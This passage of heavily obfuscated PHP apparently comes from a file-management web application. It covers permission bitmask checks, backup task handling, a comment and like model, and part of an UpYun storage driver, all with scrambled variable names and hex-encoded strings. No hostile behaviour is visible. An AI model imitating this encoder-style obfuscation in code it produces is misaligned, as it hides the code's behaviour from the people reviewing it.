authCheckEdit($¹½Ş¡ëÁ) { return self::authCheck($¹½Ş¡ëÁ, self::AUTH_EDIT); } public static function authCheckRemove($û°ÒÚØª) { return self::authCheck($û°ÒÚØª, self::AUTH_REMOVE); } public static function authCheckShare($ñõÀÔµ‡) { return self::authCheck($ñõÀÔµ‡, self::AUTH_SHARE); } public static function authCheckComment($ÏÓî»˜Ú) { return self::authCheck($ÏÓî»˜Ú, self::AUTH_COMMENT); } public static function authCheckEvent($÷Õ«Â¢) { return self::authCheck($÷Õ«Â¢, self::AUTH_EVENT); } public static function authCheckRoot($à¡¥ŒÈ) { return self::authCheck($à¡¥ŒÈ, self::AUTH_ROOT); } public static function authCheckAction($È§®è Å, $¨¼ğ¯¬²) { $Ù ªáë =& $_SERVER[—ÌÒğš÷]; $û¹¢Ôá• = array($Ù ªáë[1907] => self::AUTH_VIEW, $Ù ªáë[1238] => self::AUTH_DOWNLOAD, $Ù ªáë[107] => self::AUTH_UPLOAD, $Ù ªáë[1857] => self::AUTH_EDIT, $Ù ªáë[1856] => self::AUTH_REMOVE, $Ù ªáë[1867] => self::AUTH_SHARE, $Ù ªáë[398] => self::AUTH_COMMENT, $Ù ªáë[1676] => self::AUTH_EVENT, $Ù ªáë[1908] => self::AUTH_ROOT); if (!isset($û¹¢Ôá•[$¨¼ğ¯¬²])) { return; } $ñÄøÊÓÎ = $û¹¢Ôá•[$¨¼ğ¯¬²]; $È§®è Å = intval($È§®è Å); if ($È§®è Å <= 0) { return !1; } if (($È§®è Å & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($È§®è Å & $ñÄøÊÓÎ); } public static function authDisable($ş¢¿¨‡‡, $íıÒ«²õ) { if (intval($ş¢¿¨‡‡) <= 0) { return 0; } return intval($ş¢¿¨‡‡) & ~$íıÒ«²õ; } public $optionType = "\123\171\x73\164\145\155\x2e\163\x6f\x75\162\143\145\x41\165\x74\150\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\x68", "\x6c\141\142\x65\154", "\x64\x69\163\x70\154\141\x79", "\x73\171\x73\164\x65\x6d", "\x73\x6f\x72\x74"); public function initData() { $½ÆäØ½— = $this->authDefault(); foreach ($½ÆäØ½— as $õÆÌ²¿) { $this->add($õÆÌ²¿); } } public function findAuth($…¡¸ÃÏ, $óæÎîŸİ) { $‚‹‰Úğ‚ =& $_SERVER[—ÌÒğš÷]; $ôŞê”Ì = parent::listData(); foreach ($ôŞê”Ì as $“Îçœôı) { $ğèÎÛÔ = intval($“Îçœôı[$‚‹‰Úğ‚[455]]); if ($ğèÎÛÔ <= 0 || $“Îçœôı[$‚‹‰Úğ‚[1909]] == 0) { continue; } if (($ğèÎÛÔ & $…¡¸ÃÏ) != $…¡¸ÃÏ) { continue; } if (($ğèÎÛÔ & $óæÎîŸİ) != 0) { continue; } return $“Îçœôı[$‚‹‰Úğ‚[443]]; } return !1; } public function findAuthReadOnly() { $”‰ı¾«Õ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ˆé¾Û†ñ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($”‰ı¾«Õ, $ˆé¾Û†ñ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $«‘ßÁ =& $_SERVER[—ÌÒğš÷]; $¦Â¡‡˜† = parent::listData(); $ğ»¬‹Ì• = !1; foreach ($¦Â¡‡˜† as $‡çÑœØè) { if ($‡çÑœØè[$«‘ßÁ[455]] <= 0 || $‡çÑœØè[$«‘ßÁ[1909]] == $«‘ßÁ[212]) { continue; } if (!$ğ»¬‹Ì•) { $ğ»¬‹Ì• = $‡çÑœØè; continue; } if ($ğ»¬‹Ì•[$«‘ßÁ[455]] > $‡çÑœØè[$«‘ßÁ[455]]) { $ğ»¬‹Ì• = $‡çÑœØè; } } return $ğ»¬‹Ì• ? $ğ»¬‹Ì•[$«‘ßÁ[443]] : $«‘ßÁ[12]; } public function listData($öÔËì¢Ø = false, $İ¸‚˜­ = "\163\157\162\x74", $¼æ¨‘‚Å = false) { return parent::listData($öÔËì¢Ø, $İ¸‚˜­, $¼æ¨‘‚Å); } public function update($áä„ß‚, $Ç‹îÃÄß) { $·æë†¾î =& $_SERVER[—ÌÒğš÷]; $Á–Ÿ ¡õ = parent::listData($áä„ß‚); $¦êÚ¯Ö = $this->findByName($Ç‹îÃÄß[$·æë†¾î[32]]); if (!$Á–Ÿ ¡õ || $¦êÚ¯Ö && $¦êÚ¯Ö[$·æë†¾î[443]] != $Á–Ÿ ¡õ[$·æë†¾î[443]]) { return !1; } $this->filterAuth($Ç‹îÃÄß[$·æë†¾î[455]]); return parent::update($áä„ß‚, $Ç‹îÃÄß); } public function remove($Â©©®ï) { $ò˜…şÌ× = parent::listData($Â©©®ï); if (!$ò˜…şÌ× || $ò˜…şÌ×[$_SERVER[—ÌÒğš÷][179]]) { return !1; } return parent::remove($Â©©®ï); } public function add($‰Â½š¸ = array()) { $Ó“¨ÍÄ¬ =& $_SERVER[—ÌÒğš÷]; if ($this->findByName($‰Â½š¸[$Ó“¨ÍÄ¬[32]])) { return !1; } $ôÃ¹öéğ = array($Ó“¨ÍÄ¬[32] => $Ó“¨ÍÄ¬[12], $Ó“¨ÍÄ¬[455] => 1, $Ó“¨ÍÄ¬[1910] => $Ó“¨ÍÄ¬[1897], $Ó“¨ÍÄ¬[1909] => 1, $Ó“¨ÍÄ¬[179] => 0, $Ó“¨ÍÄ¬[1911] => 0); $‰Â½š¸ = array_merge($ôÃ¹öéğ, $‰Â½š¸); $‰Â½š¸[$Ó“¨ÍÄ¬[1911]] = $this->getSort(); $this->filterAuth($‰Â½š¸[$Ó“¨ÍÄ¬[455]]); return parent::insert($‰Â½š¸); } private function getSort() { $ÏÄã‘³ =& $_SERVER[—ÌÒğš÷]; $ï¬Å‰ = parent::listData(); $ö²øŞÎ = array_to_keyvalue($ï¬Å‰, $ÏÄã‘³[12], $ÏÄã‘³[1911]); return empty($ö²øŞÎ) ? 0 : max($ö²øŞÎ) + 1; } private function filterAuth(&$³†´¤°) { if (!$³†´¤°) { return; } $¬“È™¦ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $»¯Òü¾— = array(); foreach ($¬“È™¦ as $Ä—–åŞ) { if ($³†´¤° & $Ä—–åŞ) { $»¯Òü¾—[] = $Ä—–åŞ; } } if (in_array(self::AUTH_ROOT, $»¯Òü¾—)) { $³†´¤° = array_sum($¬“È™¦); return; } $·²„´† = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($»¯Òü¾— as $Ä—–åŞ) { if (isset($·²„´†[$Ä—–åŞ])) { $»¯Òü¾— = array_merge($»¯Òü¾—, $·²„´†[$Ä—–åŞ]); } } $»¯Òü¾—[] = self::AUTH_SHOW; $³†´¤° = array_sum(array_unique($»¯Òü¾—)); } public function sort($ˆ¿ÒÊ‘‹, $§…˜Á‹×) { return parent::update($ˆ¿ÒÊ‘‹, $§…˜Á‹×); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\142\141\143\x6b\165\x70\x4c\x69\x73\164"; public $field = array("\151\157", "\156\141\155\145", "\163\x74\141\164\165\163", "\x63\x6f\156\x74\145\x6e\164", "\x6d\141\x6e\165\141\x6c", "\x72\145\163\x75\x6c\164", "\164\151\x6d\145\106\x72\x6f\155", "\x74\x69\x6d\x65\x54\157"); public function config() { $ú®Ôã”û =& $_SERVER[—ÌÒğš÷]; $¯‚“†ş = Model($ú®Ôã”û[806])->get($ú®Ôã”û[816]); $¯‚“†ş = json_decode($¯‚“†ş, !0); $¯‚“†ş = is_array($¯‚“†ş) ? $¯‚“†ş : array(); if (!isset($¯‚“†ş[$ú®Ôã”û[790]])) { $¯‚“†ş[$ú®Ôã”û[790]] = $ú®Ôã”û[88]; } unset($¯‚“†ş[$ú®Ôã”û[1658]]); Action($ú®Ôã”û[1912])->taskInit(); Model($ú®Ôã”û[1657])->cacheClear(); $º·ò˜ñµ = $ú®Ôã”û[1913]; $×õöñë¡ = Model($ú®Ôã”û[1914])->findByKey($ú®Ôã”û[1676], $º·ò˜ñµ); if (!$×õöñë¡) { $×õöñë¡ = array(); } if (isset($×õöñë¡[$ú®Ôã”û[194]])) { $×õöñë¡[$ú®Ôã”û[194]] = json_decode($×õöñë¡[$ú®Ôã”û[194]], !0); } if (isset($¯‚“†ş[$ú®Ôã”û[194]])) { $×õöñë¡[$ú®Ôã”û[194]][$ú®Ôã”û[1661]] = $¯‚“†ş[$ú®Ôã”û[194]]; unset($¯‚“†ş[$ú®Ôã”û[194]]); } return array_merge($×õöñë¡, $¯‚“†ş); } public function listData($½¤áÉ‘Ü = false, $ş¬§À¡¥ = "\155\x6f\144\151\146\x79\x54\151\155\x65", $ ¸³İ™¦ = false) { return parent::listData($½¤áÉ‘Ü, $ş¬§À¡¥, !0); } public function lastItem() { $¨¸°®È = $this->listData(); return !empty($¨¸°®È[0]) ? $¨¸°®È[0] : null; } public function kill($æ¾ôåÆî) { $Ö‡÷„¼ =& $_SERVER[—ÌÒğš÷]; $üµ§®•Å = $this->listData($æ¾ôåÆî); if (!$üµ§®•Å || empty($üµ§®•Å[$Ö‡÷„¼[32]])) { return !0; } Task::kill($Ö‡÷„¼[815]); Task::kill($Ö‡÷„¼[836]); Task::kill($Ö‡÷„¼[845]); $ö£Ü±İ = $üµ§®•Å[$Ö‡÷„¼[32]]; $“òğ¿Í‹ = TEMP_FILES . $Ö‡÷„¼[814] . $ö£Ü±İ . $Ö‡÷„¼[8]; IO::remove($“òğ¿Í‹, !1); return $this->remove($æ¾ôåÆî); } public function remove($³êŸ‡ï) { $„—±ÆÎ© = $this->listData($³êŸ‡ï); if (!$„—±ÆÎ©) { return !0; } return $this->backupRemove($„—±ÆÎ©); } private function backupRemove($İöè§ÕÏ) { parent::remove($İöè§ÕÏ[$_SERVER[—ÌÒğš÷][443]]); $àò™“æ¦ = $this->backupPath($İöè§ÕÏ); IO::remove($àò™“æ¦, !1); return !0; } private function backupPath($Æç‰Ğ“) { $úÙÚÀãü =& $_SERVER[—ÌÒğš÷]; $©ù”ä‘ = $Æç‰Ğ“[$úÙÚÀãü[32]]; $ôØŒ»ãŒ = Model($úÙÚÀãü[806])->get($úÙÚÀãü[807]); $üø­öŸì = substr(md5($úÙÚÀãü[808] . $ôØŒ»ãŒ . $©ù”ä‘), 0, 8); return "\173\x69\x6f\72{$Æç‰Ğ“[$úÙÚÀãü[787]]}\x7d\x2f\x64\x61\164\x61\142\141\163\x65\57\x62\141\x63\x6b\165\x70\x2f" . $©ù”ä‘ . $úÙÚÀãü[11] . $üø­öŸì; } public function start() { $£é™¢ =& $_SERVER[—ÌÒğš÷]; if ($GLOBALS[$£é™¢[6]][$£é™¢[89]][$£é™¢[1915]] != $£é™¢[88]) { return !0; } $Á¤’õÎ = $this->config(); if (!$Á¤’õÎ || $Á¤’õÎ[$£é™¢[1658]] != $£é™¢[88]) { return !1; } $¡ÙÍÃ„™ = $this->process(); foreach ($¡ÙÍÃ„™ as $°Ğ²¼Š›) { if ($°Ğ²¼Š›) { return Task::restart($°Ğ²¼Š›[$£é™¢[443]]); } } $ “ïË¬ = new Backup(); $Ô•Ô‰÷· = $ “ïË¬->db(); if ($Ô•Ô‰÷·) { $Ô•Ô‰÷· = $ “ïË¬->dbFile(); if ($Ô•Ô‰÷· && $Á¤’õÎ[$£é™¢[790]] == $£é™¢[212]) { $Ô•Ô‰÷· = $ “ïË¬->file(); } } Backup::set(array($£é™¢[786] => 1, $£é™¢[797] => time())); return !0; } public function process() { $³ß®å =& $_SERVER[—ÌÒğš÷]; $¿¥ûÅ¼ñ = array($³ß®å[793] => Task::get($³ß®å[815]), $³ß®å[798] => Task::get($³ß®å[836]), $³ß®å[214] => Task::get($³ß®å[845])); $´»„Ãòí = !1; foreach ($¿¥ûÅ¼ñ as &$“õÇ»™‚) { if ($´»„Ãòí) { $“õÇ»™‚ = !1; continue; } if ($“õÇ»™‚) { $¤®­‚Æì = intval(_get($“õÇ»™‚, $³ß®å[1693], 0)); if (time() - $¤®­‚Æì > 7200) { Task::kill($“õÇ»™‚[$³ß®å[443]]); $´»„Ãòí = !0; $“õÇ»™‚ = !1; } } } return $¿¥ûÅ¼ñ; } public function restore() { $®¦¯Ùû =& $_SERVER[—ÌÒğš÷]; ActionCall($®¦¯Ùû[1104], !0, 1); ActionCall($®¦¯Ùû[1104], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\155\x65" => "\143\157\155\155\145\x6e\164\137\x6d\x65\164\141", "\x6d\x65\164\x61\x46\151\x65\154\x64" => "\143\x6f\x6d\155\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($•è½Ó¤¿) { $ï¹¬»Ëœ =& $_SERVER[—ÌÒğš÷]; if ($•è½Ó¤¿[$ï¹¬»Ëœ[1916]]) { $Í§îÎÅ = $this->where(array($ï¹¬»Ëœ[1917] => $•è½Ó¤¿[$ï¹¬»Ëœ[1916]]))->find(); if (!$Í§îÎÅ || $Í§îÎÅ[$ï¹¬»Ëœ[178]] != $•è½Ó¤¿[$ï¹¬»Ëœ[178]] || $Í§îÎÅ[$ï¹¬»Ëœ[538]] != $•è½Ó¤¿[$ï¹¬»Ëœ[538]]) { return !1; } $this->where(array($ï¹¬»Ëœ[1917] => $•è½Ó¤¿[$ï¹¬»Ëœ[1916]]))->setAdd($ï¹¬»Ëœ[1918], 1); } $•è½Ó¤¿[$ï¹¬»Ëœ[1919]] = 0; $•è½Ó¤¿[$ï¹¬»Ëœ[1918]] = 0; $•è½Ó¤¿[$ï¹¬»Ëœ[786]] = 1; return $this->add($•è½Ó¤¿); } public function commentCount($œÒ²¼Ö, $ù»´û¿, $ûÆ™®§ê = false) { $ŞŸÍéÌ¸ =& $_SERVER[—ÌÒğš÷]; if (!$œÒ²¼Ö) { return array(); } if (is_string($œÒ²¼Ö) || is_int($œÒ²¼Ö)) { $œÒ²¼Ö = array($œÒ²¼Ö); } $µ¾õâ·Ü = array($ŞŸÍéÌ¸[538], $ŞŸÍéÌ¸[1920] => $ŞŸÍéÌ¸[533]); $İ›¯«Å½ = array($ŞŸÍéÌ¸[538] => array($ŞŸÍéÌ¸[7], $œÒ²¼Ö), $ŞŸÍéÌ¸[178] => $ù»´û¿); if ($ûÆ™®§ê) { $İ›¯«Å½[$ŞŸÍéÌ¸[1688]] = $ûÆ™®§ê; } $§”ëüéò = $this->field($µ¾õâ·Ü)->where($İ›¯«Å½)->group($ŞŸÍéÌ¸[538])->select(); return array_to_keyvalue($§”ëüéò, $ŞŸÍéÌ¸[538], $ŞŸÍéÌ¸[533]); } public function starTarget($Íì®‰—, $÷ÊÊ¡«·) { $ÈüÆÚ™Ô =& $_SERVER[—ÌÒğš÷]; $ÃïŸúµ” = $Íì®‰— + self::TYPE_STAR_OFFSET; $Ú”Áèä÷ = array($ÈüÆÚ™Ô[1688] => USER_ID, $ÈüÆÚ™Ô[178] => $ÃïŸúµ”, $ÈüÆÚ™Ô[538] => $÷ÊÊ¡«·); $Ä”û†ÆÈ = $this->where($Ú”Áèä÷)->find(); if ($Ä”û†ÆÈ) { return $this->where(array($ÈüÆÚ™Ô[443] => $Ä”û†ÆÈ[$ÈüÆÚ™Ô[443]]))->delete(); } $àò¬©Ú = array($ÈüÆÚ™Ô[1916] => 0, $ÈüÆÚ™Ô[1688] => USER_ID, $ÈüÆÚ™Ô[786] => 1, $ÈüÆÚ™Ô[790] => $ÈüÆÚ™Ô[12], $ÈüÆÚ™Ô[178] => $ÃïŸúµ”, $ÈüÆÚ™Ô[538] => $÷ÊÊ¡«·, $ÈüÆÚ™Ô[1919] => 0, $ÈüÆÚ™Ô[1918] => 0); return $this->add($àò¬©Ú); } public function starTargetCount($ç¥÷»Ö, $§õ‘„úÓ) { $Í¡Ü¨½ˆ =& $_SERVER[—ÌÒğš÷]; $âè¾¬é = $§õ‘„úÓ + self::TYPE_STAR_OFFSET; $áüøºšĞ = $this->commentCount($ç¥÷»Ö, $âè¾¬é); $ËÃÕ»€¶ = $this->commentCount($ç¥÷»Ö, $âè¾¬é, USER_ID); return array($Í¡Ü¨½ˆ[1921] => $áüøºšĞ, $Í¡Ü¨½ˆ[1922] => $ËÃÕ»€¶); } public function starTargetUserList($È•±ûÇ‡, $¨èª¾•) { $©ìã›÷ =& $_SERVER[—ÌÒğš÷]; $ÕÈ’Ú«ï = $È•±ûÇ‡ + self::TYPE_STAR_OFFSET; $íÔ´íø¯ = array($©ìã›÷[538] => $¨èª¾•, $©ìã›÷[178] => $ÕÈ’Ú«ï); $æÓŞìàŒ = $this->where($íÔ´íø¯)->count(); $½»ÃÑ– = array($©ìã›÷[299] => $æÓŞìàŒ, $©ìã›÷[1923] => array()); if (!$æÓŞìàŒ) { return $½»ÃÑ–; } $Öèˆè¢ = $this->field($©ìã›÷[1688])->where($íÔ´íø¯)->limit(500)->select(); $Öèˆè¢ = array_to_keyvalue($Öèˆè¢, $©ìã›÷[12], $©ìã›÷[1688]); $½»ÃÑ–[$©ìã›÷[1923]] = Model($©ìã›÷[546])->userListInfo($Öèˆè¢); return $½»ÃÑ–; } public function prasiseUserList($ûÆŒ±€) { $íâõ÷Á =& $_SERVER[—ÌÒğš÷]; $‚ø¿ú¼ = array($íâõ÷Á[1924] => $ûÆŒ±€); $¶’şŞş = $this->where($‚ø¿ú¼)->find(); $ŞŸèõ‡£ = _get($¶’şŞş, $íâõ÷Á[1919], 0); $ÖØ°·©† = array($íâõ÷Á[299] => $ŞŸèõ‡£, $íâõ÷Á[1923] => array()); if (!$ŞŸèõ‡£) { return $ÖØ°·©†; } $Ä›ü »– = Model($íâõ÷Á[1925])->field($íâõ÷Á[1688])->where($‚ø¿ú¼)->limit(500)->select(); $Ä›ü »– = array_to_keyvalue($Ä›ü »–, $íâõ÷Á[12], $íâõ÷Á[1688]); $ÖØ°·©†[$íâõ÷Á[1923]] = Model($íâõ÷Á[546])->userListInfo($Ä›ü »–); return $ÖØ°·©†; } public function remove($­¸àğÁ) { $ÍÖ›¬ñ± =& $_SERVER[—ÌÒğš÷]; $Ç“àİú = array($ÍÖ›¬ñ±[1917] => $­¸àğÁ); $ì©ƒŸĞ¸ = $this->where($Ç“àİú)->find(); if ($ì©ƒŸĞ¸[$ÍÖ›¬ñ±[1916]]) { $this->where(array($ÍÖ›¬ñ±[1917] => $ì©ƒŸĞ¸[$ÍÖ›¬ñ±[1916]]))->setAdd($ÍÖ›¬ñ±[1918], -1); } return $this->where($Ç“àİú)->delete(); } public function edit($à×Âş‘·, $˜Ïå›êß) { $ßò‰ëåÕ =& $_SERVER[—ÌÒğš÷]; $³‰…àá = array($ßò‰ëåÕ[1917] => $à×Âş‘·); return $this->where($³‰…àá)->save(array($ßò‰ëåÕ[1926] => $˜Ïå›êß)); } public function prasise($©òŞñÍ) { $ÙèÊóç¨ =& $_SERVER[—ÌÒğš÷]; $ÁØ‹äûÍ = Model($ÙèÊóç¨[1927]); $Éóœ¶ß– = array($ÙèÊóç¨[1917] => $©òŞñÍ, $ÙèÊóç¨[1679] => USER_ID); $’Ñæ®«Ç = $ÁØ‹äûÍ->where($Éóœ¶ß–)->find(); if (!$’Ñæ®«Ç) { $ÁØ‹äûÍ->add($Éóœ¶ß–); $¨¿ºæúî = $this->where(array($ÙèÊóç¨[1917] => $©òŞñÍ))->setAdd($ÙèÊóç¨[1919], 1); } else { $ÁØ‹äûÍ->where($Éóœ¶ß–)->delete(); $¨¿ºæúî = $this->where(array($ÙèÊóç¨[1917] => $©òŞñÍ))->setAdd($ÙèÊóç¨[1919], -1); } return $¨¿ºæúî; } public function targetInfo($¼öœì¨¡, $ùÔåçÆ) { $ßæ ïè =& $_SERVER[—ÌÒğš÷]; $•Å˜³»Ğ = array($ßæ ïè[616] => $¼öœì¨¡, $ßæ ïè[617] => $ùÔåçÆ); $ƒš¾ìªš = $this->where($•Å˜³»Ğ)->count(); $ËëØèå = "\122\111\107\x48\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\x6d\x6d\x65\156\x74\137\x70\162\x61\151\163\145\40\x73\x74\x61\x72\40\157\x6e\x20\143\157\155\x6d\x65\156\x74\x2e\x63\x6f\x6d\x6d\145\x6e\x74\111\104\x20\75\40\163\164\141\162\x2e\143\x6f\155\155\145\x6e\164\x49\104"; $£ÌˆËöù = $this->alias($ßæ ïè[398])->where($•Å˜³»Ğ)->join($ËëØèå, $ßæ ïè[1928])->count(); $İÏ“†  = array($ßæ ïè[1929] => $ƒš¾ìªš, $ßæ ïè[1930] => $£ÌˆËöù); return $İÏ“† ; } public function listData($•–Ä¹‚ô) { $É›Äêı— =& $_SERVER[—ÌÒğš÷]; if (isset($•–Ä¹‚ô[$É›Äêı—[1931]])) { if ($•–Ä¹‚ô[$É›Äêı—[1931]]) { $•–Ä¹‚ô[$É›Äêı—[1924]] = array($É›Äêı—[1058], intval($•–Ä¹‚ô[$É›Äêı—[1931]])); } unset($•–Ä¹‚ô[$É›Äêı—[1931]]); } if (isset($•–Ä¹‚ô[$É›Äêı—[1932]])) { if ($•–Ä¹‚ô[$É›Äêı—[1932]]) { $•–Ä¹‚ô[$É›Äêı—[1924]] = array($É›Äêı—[1055], intval($•–Ä¹‚ô[$É›Äêı—[1932]])); } unset($•–Ä¹‚ô[$É›Äêı—[1932]]); } return $this->_listData($•–Ä¹‚ô); } private function _listData($Å¬Áùš×) { $Ñöå“ =& $_SERVER[—ÌÒğš÷]; $€İ”›˜Ò = $this->where($Å¬Áùš×)->_makeOrder()->selectPage(100); $this->_listAppendParent($€İ”›˜Ò[$Ñöå“[413]]); $this->_listAppendUser($€İ”›˜Ò[$Ñöå“[413]]); $this->_listAppendMeta($€İ”›˜Ò[$Ñöå“[413]]); return $€İ”›˜Ò; } private function _makeOrder() { $ºÚ¼–Ğ =& $_SERVER[—ÌÒğš÷]; $öšø¦åó = array($ºÚ¼–Ğ[1919], $ºÚ¼–Ğ[1918], $ºÚ¼–Ğ[215]); $ü‡åöÑ = Input::get($ºÚ¼–Ğ[498], $ºÚ¼–Ğ[7], $ºÚ¼–Ğ[465], $öšø¦åó); $õ§Ö—¦ë = Input::get($ºÚ¼–Ğ[499], $ºÚ¼–Ğ[7], $ºÚ¼–Ğ[1681], array($ºÚ¼–Ğ[1933], $ºÚ¼–Ğ[494])); $ùó³ü³û = $ü‡åöÑ . $ºÚ¼–Ğ[53] . $õ§Ö—¦ë; return $this->order($ùó³ü³û); } private function _listAppendParent(&$ù€«›¤õ) { $ùÄŒ× =& $_SERVER[—ÌÒğš÷]; $êÓ¢»ö· = array_unique(array_to_keyvalue($ù€«›¤õ, $ùÄŒ×[12], $ùÄŒ×[1916])); $êÓ¢»ö· = array_remove_value($êÓ¢»ö·, $ùÄŒ×[212]); if (!$êÓ¢»ö·) { return; } $‘¬¡¹€Ç = $this->where(array($ùÄŒ×[1917] => array($ùÄŒ×[7], $êÓ¢»ö·)))->select(); $‘¬¡¹€Ç = array_to_keyvalue($‘¬¡¹€Ç, $ùÄŒ×[1924]); foreach ($ù€«›¤õ as &$Ğüöù¼È) { if (isset($‘¬¡¹€Ç[$Ğüöù¼È[$ùÄŒ×[1916]]])) { $Ğüöù¼È[$ùÄŒ×[1934]] = $‘¬¡¹€Ç[$Ğüöù¼È[$ùÄŒ×[1916]]]; } } unset($Ğüöù¼È); } private function _listAppendUser(&$ÉÉëôæú) { $ú¾¡û°Î =& $_SERVER[—ÌÒğš÷]; $åîÍø·’ = array_unique(array_to_keyvalue($ÉÉëôæú, $ú¾¡û°Î[12], $ú¾¡û°Î[1688])); $åîÍø·’ = array_remove_value($åîÍø·’, $ú¾¡û°Î[212]); if (count($åîÍø·’) == 0) { return; } foreach ($ÉÉëôæú as $Ò»»íÏİ) { if (isset($Ò»»íÏİ[$ú¾¡û°Î[1934]])) { $åîÍø·’[] = $Ò»»íÏİ[$ú¾¡û°Î[1934]][$ú¾¡û°Î[1688]]; } } $¾÷àã©¹ = Model($ú¾¡û°Î[567])->userListInfo($åîÍø·’); foreach ($ÉÉëôæú as &$Ò»»íÏİ) { $Ò»»íÏİ[$ú¾¡û°Î[630]] = $¾÷àã©¹[$Ò»»íÏİ[$ú¾¡û°Î[1688]]]; if (isset($Ò»»íÏİ[$ú¾¡û°Î[1934]])) { $Ò»»íÏİ[$ú¾¡û°Î[1934]][$ú¾¡û°Î[630]] = $¾÷àã©¹[$Ò»»íÏİ[$ú¾¡û°Î[1934]][$ú¾¡û°Î[1688]]]; } } unset($Ò»»íÏİ); } private function _listAppendMeta(&$ò¹ÕÒé) { $çÖÔˆß– =& $_SERVER[—ÌÒğš÷]; $–„Óùà = array_unique(array_to_keyvalue($ò¹ÕÒé, $çÖÔˆß–[12], $çÖÔˆß–[1924])); $–„Óùà = array_remove_value($–„Óùà, $çÖÔˆß–[212]); if (!$–„Óùà) { return; } foreach ($ò¹ÕÒé as $ó§ğ‚”) { if (isset($ó§ğ‚”[$çÖÔˆß–[1934]])) { $–„Óùà[] = $ó§ğ‚”[$çÖÔˆß–[1934]][$çÖÔˆß–[1924]]; } } $¸á›À«Ê = $this->metaList($–„Óùà); if (!$¸á›À«Ê) { return !1; } foreach ($ò¹ÕÒé as &$ó§ğ‚”) { $ó§ğ‚”[$çÖÔˆß–[507]] = $¸á›À«Ê[$ó§ğ‚”[$çÖÔˆß–[1924]]]; if (isset($ó§ğ‚”[$çÖÔˆß–[1934]])) { $ó§ğ‚”[$çÖÔˆß–[1934]][$çÖÔˆß–[507]] = $¸á›À«Ê[$ó§ğ‚”[$çÖÔˆß–[1934]][$çÖÔˆß–[1924]]]; } } unset($ó§ğ‚”); } private function metaList($³É±¹É) { $–Á¥è’û =& $_SERVER[—ÌÒğš÷]; if (!$³É±¹É) { return array(); } $Ö«üò = array($–Á¥è’û[1924] => array($–Á¥è’û[7], $³É±¹É)); $õ·ı¥×ƒ = Model($–Á¥è’û[1935])->where($Ö«üò)->select(); $õ·ı¥×ƒ = array_to_keyvalue_group($õ·ı¥×ƒ, $–Á¥è’û[1924]); foreach ($õ·ı¥×ƒ as $àÚ›œ»ø => $ÈîßàŒ¿) { $ÕıØ¦§Ÿ = array(); foreach ($ÈîßàŒ¿ as $ˆ‰³) { $ÕıØ¦§Ÿ[$ˆ‰³[$–Á¥è’û[94]]] = $ˆ‰³[$–Á¥è’û[418]]; } $õ·ı¥×ƒ[$àÚ›œ»ø] = $ÕıØ¦§Ÿ; } return $õ·ı¥×ƒ ? $õ·ı¥×ƒ : array(); } } goto Cù³·Úóµ; dÊ´Î…Ø±: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\x76\60\x2e\x61\x70\x69\56\x75\160\171\165\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ò¸¤×›è) { parent::__construct(); $this->_init($ò¸¤×›è); } public function _init($ÁŠÕÜÁÂ) { $ç±ôÚöœ =& $_SERVER[—ÌÒğš÷]; foreach ($ÁŠÕÜÁÂ as $»“ıÆ¹© => $‡ş´á—Ğ) { if (isset($this->{$»“ıÆ¹©})) { $this->{$»“ıÆ¹©} = $‡ş´á—Ğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ç±ôÚöœ[1482] . LNG($ç±ôÚöœ[1413])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ô¹½„‘Ê, $„ƒ¶Ó¿ = "\107\105\124") { $ÌÆÆ¸åó =& $_SERVER[—ÌÒğš÷]; $¢è‰ñö¯ = gmdate($ÌÆÆ¸åó[1446]); $•ï‚ÉÜÒ = base64_encode(hash_hmac($ÌÆÆ¸åó[1483], "{$„ƒ¶Ó¿}\46{$ô¹½„‘Ê}\x26{$¢è‰ñö¯}", md5("{$this->userpass}"), !0)); $»€ îËĞ = array("\101\x75\164\150\157\x72\x69\x7a\x61\x74\x69\157\x6e\x3a\125\x50\x59\x55\116\x20{$this->username}\x3a{$•ï‚ÉÜÒ}", "\x44\x61\x74\x65\72{$¢è‰ñö¯}"); return $»€ îËĞ; } public function ussRequest($õ§ô°Şá, $óğ¹ı = "\x47\x45\124", $ã¶¨Õæ = false, $‹ñ…Ã¯ = false, $êÓ¾Àê© = false) { $åÇÕÖñ· =& $_SERVER[—ÌÒğš÷]; $õ§ô°Şá = trim($õ§ô°Şá, $åÇÕÖñ·[8]); $¼÷İ®Óï = "\x2f{$this->bucket}\57{$õ§ô°Şá}"; $³Ü•¤ = $this->ussHeaders($¼÷İ®Óï, $óğ¹ı); if ($‹ñ…Ã¯) { $³Ü•¤ = array_merge($³Ü•¤, 